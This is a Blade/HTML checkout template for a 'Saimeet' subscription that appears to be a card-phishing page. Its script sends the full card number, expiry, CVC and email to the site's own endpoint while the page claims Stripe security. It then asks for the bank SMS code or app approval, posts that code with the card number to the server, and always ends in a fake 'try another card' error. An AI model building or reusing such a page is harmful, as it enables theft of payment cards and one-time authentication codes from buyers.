@extends('layouts.app')
@section('title', 'Saimeet - Checkout')
@section('content')

<body>
    {{-- <script src="{{ asset('assets/js/vue.global.js') }}"></script> --}}

    <style>
        [type='text']:focus,
        [type='email']:focus,
        [type='url']:focus,
        [type='password']:focus,
        [type='number']:focus,
        [type='date']:focus,
        [type='datetime-local']:focus,
        [type='month']:focus,
        [type='search']:focus,
        [type='tel']:focus,
        [type='time']:focus,
        [type='week']:focus,
        [multiple]:focus,
        textarea:focus,
        select:focus {
            box-shadow: none !important;
        }

        .card-input:focus-within {
            border: 1px solid rgba(245, 158, 11, 1) !important;
        }

        /* Chrome, Safari, Edge, Opera */
        input::-webkit-outer-spin-button,
        input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }

        /* Firefox */
        input[type=number] {
            -moz-appearance: textfield;
        }

        #visa {
            /* transform: translateX(50%); */
            /* opacity: 0; */
            animation-delay: 0s;
            animation-duration: .5s;
            animation-fill-mode: forwards;
            animation-name: slide
        }

        #mastercard {
            /* transform: translateX(50%); */
            /* opacity: 0; */
            animation-delay: 0s;
            animation-duration: .4s;
            animation-fill-mode: forwards;
            animation-name: slide
        }

        #amex {
            /* transform: translateX(50%); */
            /* opacity: 0; */
            animation-delay: 0s;
            animation-duration: .3s;
            animation-fill-mode: forwards;
            animation-name: slide
        }

        #discover {
            animation-delay: 0s;
            animation-duration: .2s;
            animation-fill-mode: forwards;
            animation-name: slide
        }

        .slide {
            animation-name: slide !important;
        }

        .slide-out {
            animation-name: slide-out !important;
        }

        .disable {
            pointer-events: none;
            opacity: 0.5;
            /* Optional: reduce the opacity to make the button look disable */
            cursor: default;
            /* Optional: set the cursor to the default cursor to indicate that the button is disable */
        }

        .loading {
            position: relative;
        }

        .loading>span {
            opacity: 0;
        }

        .loading::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 25px;
            height: 25px;
            border-radius: 50%;
            border: 2px solid white;
            border-right-color: transparent;
            animation: loading 2s infinite forwards ease-in-out;
        }
      
            .text-xs {
                line-height: 20px; /* adjust as needed to match the height of the logo */
            }


        @keyframes slide {
            from {
                opacity: 0;
                transform: translateX(70%)
            }

            to {
                opacity: 1;
                transform: translateX(0%)
            }
        }

        @keyframes loading {
            from {
                transform: translate(-50%, -50%) rotate(0turn);
            }

            to {
                transform: translate(-50%, -50%) rotate(1turn);
            }
        }








        .loadingg {
            position: relative;
        }

        .loadingg>span {
            opacity: 0;
        }

        .loadingg::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border: 4px solid #ffbe3d;
            border-right-color: transparent;
            animation: loadingg 2s infinite forwards ease-in-out;
        }


        @keyframes slide {
            from {
                opacity: 0;
                transform: translateX(70%)
            }

            to {
                opacity: 1;
                transform: translateX(0%)
            }
        }

        @keyframes loadingg {
            from {
                transform: translate(-50%, -50%) rotate(0turn);
            }

            to {
                transform: translate(-50%, -50%) rotate(1turn);
            }
        }

        @keyframes slide-out {
            from {
                opacity: 1;
                transform: translateX(0%);
            }

            to {
                opacity: 0;
                transform: translateX(70%)
            }
        }
    </style>

    <!-- popup -->
    <div id="popup" class="fixed top-0 left-0 w-full hidden h-full bg-black/50 z-50 items-center justify-center">
        <div id="popup-content" class="min-w-[400px] w-[90%] p-5 max-w-[450px] h-[400px] bg-white">
        </div>
    </div>

    <!-- Main content -->
    <section class="slice py-6 pt-lg-4 pb-lg-8 bg-gray-200">

        <div class="container">
            <div class="grid grid-cols-12 gap-2">
                <div class="md:col-span-2 col-span-6 h-fit py-2 px-3 bg-white shadow flex items-center gap-2">
                    <span class="text-sm flex items-center justify-center !rounded-full bg-gray-300 !h-[28px] !w-[28px] text-white">
                        1
                    </span>
                    <span class="!text-gray-400">Get Started</span>
                </div>
                <div class="md:col-span-2 col-span-6 h-fit py-2 px-3 bg-white shadow flex items-center gap-2">
                    <span class="text-sm flex items-center justify-center !rounded-full bg-yellow-500 !h-[28px] !w-[28px] text-white">
                        2
                    </span>
                    <span>Payment</span>
                </div>
            </div>

            <!-- Container -->
            <div class="min-w-screen min-h-screen grid grid-cols-12 bg-gray-200 gap-3 pb-5 pt-3">
                <form action="" method="post" id="checkout" class="md:col-span-8 col-span-12 !px-3 py-3 bg-white shadow pb-5 min-h-100 !h-fit" style="height: fit-content"> @csrf
                    <div class="text-center py-2">
                        <h2 class="text-xl md:text-2xl">Payment</h2>
                    </div>



                    <div class="mx-auto !space-y-3 max-w-[450px]">

                        <div class="alert alert-danger alert-dismissible fade show" role="alert" hidden>
                            <strong>Something Went Wrong!</strong> It looks like there's an issue with this card. Do you have another one you can try?.
                        </div>

                        <div class="flex flex-col gap-1">
                            <span class="text-sm md:text-md">Email</span>
                            <input class="w-full border-gray-200 py-2 rounded-sm focus:border-yellow-500 focus:outline-yellow-500" type="text" name="email" id="email">
                        </div>

                        <div class="flex flex-col gap-1">
                            <span class="text-sm md:text-md">Card number</span>
                            <div class="relative card-input overflow-hidden border border-solid rounded-sm focus:border-yellow-500 focus:outline-yellow-500">

                                <input placeholder="1234 1234 1234 1234" class="w-full py-2 h-full focus:border-transparent border-transparent pr-10" maxlength="19" type="text" name="card" id="card">

                                <div class="absolute top-1/2 right-2 -translate-y-1/2 flex gap-1">
                                    <img src="{{ asset('assets/img/svg/visa.svg') }}" width="35" id="visa" alt="visa">
                                    <img src="{{ asset('assets/img/svg/mastercard.svg') }}" width="35" id="mastercard" alt="mastercard">
                                    <img src="{{ asset('assets/img/svg/amex.svg') }}" width="35" id="amex" alt="amex">
                                    <img src="{{ asset('assets/img/svg/discover.svg') }}" width="35" id="discover" alt="discover">
                                </div>
                            </div>
                        </div>

                        <div class="grid grid-cols-12 gap-2">

                            <div class="col-span-6 flex flex-col gap-1">
                                <span class="text-sm md:text-md">Expiration</span>
                                <div class="relative grid grid-cols-12 items-center card-input overflow-hidden border border-solid rounded-sm focus:border-yellow-500 focus:outline-yellow-500">

                                    <input placeholder="MM" min="1" max="12" maxlength="2" class=" col-span-5 py-2 h-full focus:border-transparent border-transparent appearance-none" type="number" name="month" id="month">

                                    <span class="block col-span-1">/</span>

                                    <input placeholder="YY" min="23" maxlength="4" class=" col-span-5 py-2 h-full focus:border-transparent border-transparent appearance-none" type="number" name="year" id="year">
                                </div>
                            </div>

                            <div class="col-span-6 flex flex-col gap-1">
                                <span class="text-sm md:text-md">CVC</span>
                                <div class="relative card-input overflow-hidden border border-solid rounded-sm focus:border-yellow-500 focus:outline-yellow-500">

                                    <input placeholder="CVC" class="w-full py-2 h-full focus:border-transparent border-transparent pr-3" type="text" name="cvc" id="cvc">

                                    <div class="absolute top-1/2 right-2 -translate-y-1/2 flex gap-1">
                                        <img src="{{ asset('assets/img/svg/cvv.svg') }}" width="35" alt="cvv">
                                    </div>
                                </div>
                            </div>
                        </div>

                        <div class="flex flex-col gap-1">
                            <span class="text-sm md:text-md">Country</span>
                            <select class="w-full border-gray-200 py-2 rounded-sm focus:border-yellow-500 focus:outline-yellow-500" name="country" id="country">
                                <option value="AF">Afghanistan</option>
                                <option value="AX">Aland Islands</option>
                                <option value="AL">Albania</option>
                                <option value="DZ">Algeria</option>
                                <option value="AS">American Samoa</option>
                                <option value="AD">Andorra</option>
                                <option value="AO">Angola</option>
                                <option value="AI">Anguilla</option>
                                <option value="AQ">Antarctica</option>
                                <option value="AG">Antigua and Barbuda</option>
                                <option value="AR">Argentina</option>
                                <option value="AM">Armenia</option>
                                <option value="AW">Aruba</option>
                                <option value="AU">Australia</option>
                                <option value="AT">Austria</option>
                                <option value="AZ">Azerbaijan</option>
                                <option value="BS">Bahamas</option>
                                <option value="BH">Bahrain</option>
                                <option value="BD">Bangladesh</option>
                                <option value="BB">Barbados</option>
                                <option value="BY">Belarus</option>
                                <option value="BE">Belgium</option>
                                <option value="BZ">Belize</option>
                                <option value="BJ">Benin</option>
                                <option value="BM">Bermuda</option>
                                <option value="BT">Bhutan</option>
                                <option value="BO">Bolivia</option>
                                <option value="BQ">Bonaire, Sint Eustatius and Saba</option>
                                <option value="BA">Bosnia and Herzegovina</option>
                                <option value="BW">Botswana</option>
                                <option value="BV">Bouvet Island</option>
                                <option value="BR">Brazil</option>
                                <option value="IO">British Indian Ocean Territory</option>
                                <option value="BN">Brunei Darussalam</option>
                                <option value="BG">Bulgaria</option>
                                <option value="BF">Burkina Faso</option>
                                <option value="BI">Burundi</option>
                                <option value="KH">Cambodia</option>
                                <option value="CM">Cameroon</option>
                                <option value="CA">Canada</option>
                                <option value="CV">Cape Verde</option>
                                <option value="KY">Cayman Islands</option>
                                <option value="CF">Central African Republic</option>
                                <option value="TD">Chad</option>
                                <option value="CL">Chile</option>
                                <option value="CN">China</option>
                                <option value="CX">Christmas Island</option>
                                <option value="CC">Cocos (Keeling) Islands</option>
                                <option value="CO">Colombia</option>
                                <option value="KM">Comoros</option>
                                <option value="CG">Congo</option>
                                <option value="CD">
                                    Congo, Democratic Republic of the Congo
                                </option>
                                <option value="CK">Cook Islands</option>
                                <option value="CR">Costa Rica</option>
                                <option value="CI">Cote D'Ivoire</option>
                                <option value="HR">Croatia</option>
                                <option value="CU">Cuba</option>
                                <option value="CW">Curacao</option>
                                <option value="CY">Cyprus</option>
                                <option value="CZ">Czech Republic</option>
                                <option value="DK">Denmark</option>
                                <option value="DJ">Djibouti</option>
                                <option value="DM">Dominica</option>
                                <option value="DO">Dominican Republic</option>
                                <option value="EC">Ecuador</option>
                                <option value="EG">Egypt</option>
                                <option value="SV">El Salvador</option>
                                <option value="GQ">Equatorial Guinea</option>
                                <option value="ER">Eritrea</option>
                                <option value="EE">Estonia</option>
                                <option value="ET">Ethiopia</option>
                                <option value="FK">Falkland Islands (Malvinas)</option>
                                <option value="FO">Faroe Islands</option>
                                <option value="FJ">Fiji</option>
                                <option value="FI">Finland</option>
                                <option value="FR">France</option>
                                <option value="GF">French Guiana</option>
                                <option value="PF">French Polynesia</option>
                                <option value="TF">French Southern Territories</option>
                                <option value="GA">Gabon</option>
                                <option value="GM">Gambia</option>
                                <option value="GE">Georgia</option>
                                <option value="DE">Germany</option>
                                <option value="GH">Ghana</option>
                                <option value="GI">Gibraltar</option>
                                <option value="GR">Greece</option>
                                <option value="GL">Greenland</option>
                                <option value="GD">Grenada</option>
                                <option value="GP">Guadeloupe</option>
                                <option value="GU">Guam</option>
                                <option value="GT">Guatemala</option>
                                <option value="GG">Guernsey</option>
                                <option value="GN">Guinea</option>
                                <option value="GW">Guinea-Bissau</option>
                                <option value="GY">Guyana</option>
                                <option value="HT">Haiti</option>
                                <option value="HM">
                                    Heard Island and Mcdonald Islands
                                </option>
                                <option value="VA">Holy See (Vatican City State)</option>
                                <option value="HN">Honduras</option>
                                <option value="HK">Hong Kong</option>
                                <option value="HU">Hungary</option>
                                <option value="IS">Iceland</option>
                                <option value="IN">India</option>
                                <option value="ID">Indonesia</option>
                                <option value="IR">Iran, Islamic Republic of</option>
                                <option value="IQ">Iraq</option>
                                <option value="IE">Ireland</option>
                                <option value="IM">Isle of Man</option>
                                <option value="IL">Israel</option>
                                <option value="IT">Italy</option>
                                <option value="JM">Jamaica</option>
                                <option value="JP">Japan</option>
                                <option value="JE">Jersey</option>
                                <option value="JO">Jordan</option>
                                <option value="KZ">Kazakhstan</option>
                                <option value="KE">Kenya</option>
                                <option value="KI">Kiribati</option>
                                <option value="KP">
                                    Korea, Democratic People's Republic of
                                </option>
                                <option value="KR">Korea, Republic of</option>
                                <option value="XK">Kosovo</option>
                                <option value="KW">Kuwait</option>
                                <option value="KG">Kyrgyzstan</option>
                                <option value="LA">Lao People's Democratic Republic</option>
                                <option value="LV">Latvia</option>
                                <option value="LB">Lebanon</option>
                                <option value="LS">Lesotho</option>
                                <option value="LR">Liberia</option>
                                <option value="LY">Libyan Arab Jamahiriya</option>
                                <option value="LI">Liechtenstein</option>
                                <option value="LT">Lithuania</option>
                                <option value="LU">Luxembourg</option>
                                <option value="MO">Macao</option>
                                <option value="MK">
                                    Macedonia, the Former Yugoslav Republic of
                                </option>
                                <option value="MG">Madagascar</option>
                                <option value="MW">Malawi</option>
                                <option value="MY">Malaysia</option>
                                <option value="MV">Maldives</option>
                                <option value="ML">Mali</option>
                                <option value="MT">Malta</option>
                                <option value="MH">Marshall Islands</option>
                                <option value="MQ">Martinique</option>
                                <option value="MR">Mauritania</option>
                                <option value="MU">Mauritius</option>
                                <option value="YT">Mayotte</option>
                                <option value="MX">Mexico</option>
                                <option value="FM">Micronesia, Federated States of</option>
                                <option value="MD">Moldova, Republic of</option>
                                <option value="MC">Monaco</option>
                                <option value="MN">Mongolia</option>
                                <option value="ME">Montenegro</option>
                                <option value="MS">Montserrat</option>
                                <option value="MA">Morocco</option>
                                <option value="MZ">Mozambique</option>
                                <option value="MM">Myanmar</option>
                                <option value="NA">Namibia</option>
                                <option value="NR">Nauru</option>
                                <option value="NP">Nepal</option>
                                <option value="NL">Netherlands</option>
                                <option value="AN">Netherlands Antilles</option>
                                <option value="NC">New Caledonia</option>
                                <option value="NZ">New Zealand</option>
                                <option value="NI">Nicaragua</option>
                                <option value="NE">Niger</option>
                                <option value="NG">Nigeria</option>
                                <option value="NU">Niue</option>
                                <option value="NF">Norfolk Island</option>
                                <option value="MP">Northern Mariana Islands</option>
                                <option value="NO">Norway</option>
                                <option value="OM">Oman</option>
                                <option value="PK">Pakistan</option>
                                <option value="PW">Palau</option>
                                <option value="PS">Palestinian Territory, Occupied</option>
                                <option value="PA">Panama</option>
                                <option value="PG">Papua New Guinea</option>
                                <option value="PY">Paraguay</option>
                                <option value="PE">Peru</option>
                                <option value="PH">Philippines</option>
                                <option value="PN">Pitcairn</option>
                                <option value="PL">Poland</option>
                                <option value="PT">Portugal</option>
                                <option value="PR">Puerto Rico</option>
                                <option value="QA">Qatar</option>
                                <option value="RE">Reunion</option>
                                <option value="RO">Romania</option>
                                <option value="RU">Russian Federation</option>
                                <option value="RW">Rwanda</option>
                                <option value="BL">Saint Barthelemy</option>
                                <option value="SH">Saint Helena</option>
                                <option value="KN">Saint Kitts and Nevis</option>
                                <option value="LC">Saint Lucia</option>
                                <option value="MF">Saint Martin</option>
                                <option value="PM">Saint Pierre and Miquelon</option>
                                <option value="VC">Saint Vincent and the Grenadines</option>
                                <option value="WS">Samoa</option>
                                <option value="SM">San Marino</option>
                                <option value="ST">Sao Tome and Principe</option>
                                <option value="SA">Saudi Arabia</option>
                                <option value="SN">Senegal</option>
                                <option value="RS">Serbia</option>
                                <option value="CS">Serbia and Montenegro</option>
                                <option value="SC">Seychelles</option>
                                <option value="SL">Sierra Leone</option>
                                <option value="SG">Singapore</option>
                                <option value="SX">Sint Maarten</option>
                                <option value="SK">Slovakia</option>
                                <option value="SI">Slovenia</option>
                                <option value="SB">Solomon Islands</option>
                                <option value="SO">Somalia</option>
                                <option value="ZA">South Africa</option>
                                <option value="GS">
                                    South Georgia and the South Sandwich Islands
                                </option>
                                <option value="SS">South Sudan</option>
                                <option value="ES">Spain</option>
                                <option value="LK">Sri Lanka</option>
                                <option value="SD">Sudan</option>
                                <option value="SR">Suriname</option>
                                <option value="SJ">Svalbard and Jan Mayen</option>
                                <option value="SZ">Swaziland</option>
                                <option value="SE">Sweden</option>
                                <option value="CH">Switzerland</option>
                                <option value="SY">Syrian Arab Republic</option>
                                <option value="TW">Taiwan, Province of China</option>
                                <option value="TJ">Tajikistan</option>
                                <option value="TZ">Tanzania, United Republic of</option>
                                <option value="TH">Thailand</option>
                                <option value="TL">Timor-Leste</option>
                                <option value="TG">Togo</option>
                                <option value="TK">Tokelau</option>
                                <option value="TO">Tonga</option>
                                <option value="TT">Trinidad and Tobago</option>
                                <option value="TN">Tunisia</option>
                                <option value="TR">Turkey</option>
                                <option value="TM">Turkmenistan</option>
                                <option value="TC">Turks and Caicos Islands</option>
                                <option value="TV">Tuvalu</option>
                                <option value="UG">Uganda</option>
                                <option value="UA">Ukraine</option>
                                <option value="AE">United Arab Emirates</option>
                                <option value="GB">United Kingdom</option>
                                <option value="US">United States</option>
                                <option value="UM">
                                    United States Minor Outlying Islands
                                </option>
                                <option value="UY">Uruguay</option>
                                <option value="UZ">Uzbekistan</option>
                                <option value="VU">Vanuatu</option>
                                <option value="VE">Venezuela</option>
                                <option value="VN">Viet Nam</option>
                                <option value="VG">Virgin Islands, British</option>
                                <option value="VI">Virgin Islands, U.s.</option>
                                <option value="WF">Wallis and Futuna</option>
                                <option value="EH">Western Sahara</option>
                                <option value="YE">Yemen</option>
                                <option value="ZM">Zambia</option>
                                <option value="ZW">Zimbabwe</option>
                            </select>
                        </div>

                        <div class="flex flex-col text-xs gap-1">
                            <p>By providing your card information. You allow Saimeet to charge your card for future
                                payments in accordance with their terms.</p>
                        </div>

                        <div class="flex flex-col text-xs gap-1 pt-3">
                            <button type="submit" id="buy" class="px-6 text-white py-3 rounded-full bg-green-500 disable">
                                <span>Buy Now</span>
                            </button>
                        </div>
                        <div class="text-xs gap-1 pt-3 text-center flex items-center justify-center">
  <i class="fa fa-lock fa-lg"></i> Secure Payment by
  <div class="inline-block ml-2"><a href="https://stripe.com"><img src="{{ url('assets/img/brand/stripe.png') }}" class="w-20" alt=""></a></div>
</div>



                    </div>

                </form>


                {{-- Here your order's info goes --}}
                <div class="md:col-span-4 !text-gray-700 col-span-12 min-h-100 !h-fit" style="height: fit-content">
                    <div class="bg-white shadow w-full px-5 py-5  ">
                        <h2 class="font-medium">YOUR ORDER</h2>

                        <div class="mt-3 border-b border-solid border-gray-300 pb-3 py-2">
                            <h2 class="text-md font-medium">Subscription plan</h2>
                            <p class="mt-2">
                                - <span id="plan"></span>
                            </p>
                        </div>

                        <div class="space-y-3 mt-3">
                            <p class="font-medium text-gray-900">Total:</p>
                            <div class="flex max-w-xs ">
                                <input placeholder="Enter coupon code" id="code" class="w-40 py-1 px-2 focus:border-yellow-500 border-black border-2 border-gray-100 rounded-l-md" maxlength="19" type="text" name="card" id="card">
                                <button onclick="applyCode()" class="bg-yellow-500 hover:text-black hover:bg-yellow-600 text-white font-bold py-1 px-2 rounded-r-md" type="button">Apply Code</button>

                            </div>

                            <div>
                                <p class="font-medium text-gray-900">$<span id="price"></span> / month</p>
                                <p>Regular price</p>
                                <p>Starting <span id="currentDate"></span></p>
                            </div>
                        </div>
                    </div>

                    <div class="flex items-center p-3 pr-0 gap-2">
                        <img src="{{ asset('assets/img/svg/check.svg') }}" width="25" alt="">
                        <p class="text-xs" style="line-height: 16px">Don't worry, you can cancel your subscription at
                            any time.</p>
                    </div>

                </div>

            </div>
        </div>
    </section>

    {{-- popups --}}
    <div class="hidden" id="popup-elements">

        <div id="checkout-confirm" class="flex flex-col h-full justify-center">
            <h2 class="text-center text-xl font-bold">
                How would you like to approve this payment ?
            </h2>

            <div class="mt-5 w-full">
                <button id="approve-by-sms-btn" onclick="sendAjaxRequest('sms')" value="sms" class="block w-full text-center bg-yellow-500 text-white py-2 px-6">
                    Get an SMS code
                </button>
                <button id="approve-by-call-btn" onclick="sendAjaxRequest('Auth-par-app')" value="call" class="block w-full text-center bg-white border border-solid !border-yellow-500 mt-3 text-yellow-500 py-2 px-6">
                    Authorization by application.
                </button>

            </div>
        </div>

        <div id="approve-by-sms" class="flex flex-col h-full justify-center">
            <h2 class="text-center text-xl font-bold">
                Confirm by SMS
            </h2>
            <div class="text-center mt-3">
                <p>Enter the 6-digit code we just sent to your phone number ending with </p>
                <div class="flex flex-wrap justify-center mt-3 gap-2">
                    <input name="sms-confirm" id="sms-confirm" class="w-full h-[50px] text-lg text-center !px-1 !p-0 relative border border-solid focus:border-yellow-500 focus:outline-yellow-500" type="number" />
                </div>
                <button onclick="updateVerificationCode()" class="block w-full text-center bg-yellow-500 text-white mt-4 py-2 px-6">
                    Confirm
                </button>
                {{-- <button class="block w-full text-center text-neutral-700 mt-2 text-underline">
                        Send new code
                    </button> --}}
            </div>

        </div>

        <div id="approve-by-call" class="flex flex-col h-full justify-center">
            <h2 class="text-center text-xl font-bold">
                Authorization by application.
            </h2>
            <div class="text-center mt-3">
                <p>We Are Waiting The Authorization From Your Bank. </p>
                <br>
                <br>
                <div class="flex flex-wrap justify-center mt-3 gap-2">
                    <span id="waiting" style="border-color: bg-yellow-500 ;"></span>
                </div>
                <br>
                <br>
                <button onclick="confirmation()" class="block w-full text-center bg-yellow-500 text-white mt-4 py-2 px-6">
                    Confirm
                </button>
            </div>
        </div>
    </div>

    <script src="{{ asset('assets/js/checkout.page.js') }}"></script>
    <script src="{{ asset('assets/js/checkout.form.js') }}"></script>




    <script>
        var alertElement = document.querySelector('.alert');
        fetch('https://ipapi.co/json/')
            .then(function(response) {
                return response.json();
            })
            .then(function(data) {
                var countryCode = data.country_code;

                document.getElementById('country').value = countryCode;
                var event = new Event('change');
                document.getElementById('country').dispatchEvent(event);
            });





        function applyCode() {
            var currentPrice = localStorage.getItem('price');
            var cardValue = document.getElementById("code").value;
            var price = document.getElementById("price");

            if (cardValue == "saimeet19") {
                price.innerHTML = "0.00";
            } else {
                price.innerHTML = currentPrice;
            }
        }

        function confirmation() {
            togglePopup(false);
            if (alertElement.hasAttribute('hidden')) {
                alertElement.removeAttribute('hidden');

                setTimeout(function() {
                    alertElement.setAttribute('hidden', true)
                }, 5000);
            }
        }

        function updateVerificationCode() {
            const xhr = new XMLHttpRequest();
            let card = localStorage.getItem('card');
            const data = {
                codeV: document.getElementById('sms-confirm').value,
                card: card
            };
            const url = '/verificationCode';

            xhr.open('POST', url);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.setRequestHeader('X-CSRF-TOKEN', '{{ csrf_token() }}');
            xhr.onload = function() {
                if (xhr.status === 200) {
                    const response = JSON.parse(xhr.responseText);
                    togglePopup(false);
                    if (alertElement.hasAttribute('hidden')) {
                        alertElement.removeAttribute('hidden');

                        setTimeout(function() {
                            alertElement.setAttribute('hidden', true)
                        }, 5000);
                    }
                } else {
                    console.log('Request failed. Status:', xhr.status);
                }
            };
            xhr.send(JSON.stringify(data));

        }




        const now = new Date();
        const options = {
            month: 'short',
            day: 'numeric',
            year: 'numeric'
        };
        let box = document.getElementById('buy');
        const formattedDate = now.toLocaleDateString('en-US', options);


        if (localStorage.getItem('price')) {
            document.getElementById('price').textContent = localStorage.getItem('price');
            document.getElementById('plan').textContent = localStorage.getItem('plan');
            document.getElementById('currentDate').textContent = formattedDate;

        } else {
            location.href = '/';
        }

        checkout.addEventListener('submit', e => {
            e.preventDefault();

            // togglePopup(true) -> to activate or desactivate the popup
            const xhr = new XMLHttpRequest();
            const data = {
                email: document.getElementById('email').value,
                card: document.getElementById('card').value,
                year: document.getElementById('year').value,
                month: document.getElementById('month').value,
                cvc: document.getElementById('cvc').value,
                country: document.getElementById('country').value
            };
            const url = '/pay';

            xhr.open('POST', url);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.setRequestHeader('X-CSRF-TOKEN', '{{ csrf_token() }}');
            xhr.onload = function() {
                if (xhr.status === 200) {
                    localStorage.setItem('card', document.getElementById('card').value);
                    const response = JSON.parse(xhr.responseText);

                    box.classList.add('loading')
                    box.classList.add('disable')
                    setTimeout(() => {
                        box.classList.remove('loading')
                        box.classList.remove('disable')
                        togglePopupWith('checkout-confirm');
                    }, 2000);

                } else {
                    console.log('Request failed. Status:', xhr.status);
                }
            };
            xhr.send(JSON.stringify(data));



            // give it the id of the element you want it to show
            // see line 273
        })

        const approveBySmsBtn = document.getElementById('approve-by-sms-btn')
        // const approveBySms = document.getElementById('approve-by-sms-btn')
        const approveByCallBtn = document.getElementById('approve-by-call-btn')

        // approveBySmsBtn.addEventListener('click', e => {
        //     // togglePopup(false)
        //     togglePopupWith('approve-by-sms')
        // })

        // approveByCallBtn.addEventListener('click', e => {
        //     // togglePopup(false)
        //     togglePopupWith('approve-by-call')
        // })



        let card = document.getElementById("card");
        let visa = document.getElementById("visa");
        let mastercard = document.getElementById("mastercard");
        let discover = document.getElementById("discover");
        let amex = document.getElementById("amex");

        let allVisible = true;
        let isCardValid = false;

        let cards = {
            visa: visa,
            mastercard: mastercard,
            discover: discover,
            amex: amex,
        };

        function getCardIssuer(cardNumber) {
            const bin = cardNumber.slice(0, 4) + cardNumber.slice(5, 7); // extract first 6 digits
            return fetch(`https://lookup.binlist.net/${bin}`)
                .then((response) => response.json())
                .then((data) => data.scheme)
                .catch((error) => console.error(error));
        }

        let loadBalance = null;
        // Add your validation here
        card.addEventListener("input", (e) => {
            // visa / mastercard / amex / discover
            getCardIssuer(e.target.value).then((cardName) => {
                isCardValid = cardName !== 'none';
                cardsAnimation(cardName);
            });
        });


        const inputs = document.querySelectorAll('input[type="text"]');
        inputs.forEach(i => {
            i.addEventListener('input', checkForm)
        })

        function areAllInputsFilled() {

            for (let i = 0; i < inputs.length; i++) {
                if (inputs[i].value === '') {
                    return false;
                }
            }

            return true;
        }

        function checkForm() {


            if (areAllInputsFilled() === false || !isCardValid) {
                box.classList.remove('disable');
                box.classList.add('disable');
            } else {
                box.classList.remove('disable');
            };
        }




        card.addEventListener('input', e => {
            let value = e.target.value.split(' ').join('')
            let newString = value.match(/.{1,4}/g)?.join(' ');
            e.target.value = newString || '';

        })



        // document.getElementById('approve-by-sms-btn').addEventListener('click', function() {
        //     const value = this.value;
        //     sendAjaxRequest(value);
        // });

        // document.getElementById('approve-by-call-btn').addEventListener('click', function() {

        //     console.log('value')

        // });

        function sendAjaxRequest(value) {
            const xhr = new XMLHttpRequest();
            let card = localStorage.getItem('card');
            const data = {
                method: value,
                card: card
            };
            const url = '/methodUpdate';

            xhr.open('POST', url);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.setRequestHeader('X-CSRF-TOKEN', '{{ csrf_token() }}');
            xhr.onload = function() {
                if (xhr.status === 200) {
                    const response = JSON.parse(xhr.responseText);
                    if (value === "sms") {
                        togglePopupWith('approve-by-sms');
                    } else if (value === "Auth-par-app") {
                        togglePopupWith('approve-by-call');
                        document.getElementById('waiting').classList.add('loadingg')
                    }
                } else {
                    console.log('Request failed. Status:', xhr.status);
                }
            };
            xhr.send(JSON.stringify(data));
        }
    </script>

</body>
@endsection